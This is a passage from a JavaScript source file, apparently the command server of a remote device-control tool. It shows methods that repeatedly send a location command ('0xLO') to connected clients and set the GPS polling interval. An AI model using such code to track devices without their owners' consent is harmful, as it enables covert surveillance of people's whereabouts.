        else return cb('Command ID Not Found');
    }

    gpsPoll(clientID) {
        if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);

        let clientDB = this.getClientDatabase(clientID);
        let gpsSettings = clientDB.get('GPSSettings').value();

        if (gpsSettings.updateFrequency > 0) {
            this.gpsPollers[clientID] = setInterval(() => {
                logManager.log(CONST.logTypes.info, clientID + " POLL COMMAND - GPS");
                this.sendCommand(clientID, '0xLO')
            }, gpsSettings.updateFrequency * 1000);
        }
    }

    setGpsPollSpeed(clientID, pollevery, cb) {
        if (pollevery >= 30) {
            let clientDB = this.getClientDatabase(clientID);
            clientDB.get('GPSSettings').assign({ updateFrequency: pollevery }).write();
            cb(false);
            this.gpsPoll(clientID);
        } else return cb('Polling Too Short!')
    }
}

module.exports = Clients;